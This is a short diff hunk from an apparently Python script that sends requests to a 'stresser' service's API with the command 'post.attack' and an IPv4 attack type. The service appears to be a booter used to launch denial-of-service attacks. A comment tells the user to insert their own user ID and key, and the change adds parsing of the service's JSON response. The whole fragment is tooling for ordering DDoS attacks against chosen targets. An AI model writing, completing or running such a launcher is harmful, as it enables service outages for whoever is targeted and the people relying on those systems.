@@ -125,6 +125,7 @@ ID	Name	Type	Description
     baseurl = "http://zdstresser.net/panel/apiv1/?userid=REDACTED&key=REDACTED&command=post.attack&type=ip4" #Put your userid and key where it says redacted
     print("Executing...\n")
     response = requests.get(baseurl, params=payload)
+    responsejson = response.json()
     print("Checking response...")
     for key, value in responsejson.items():
         print(key, ":", value)
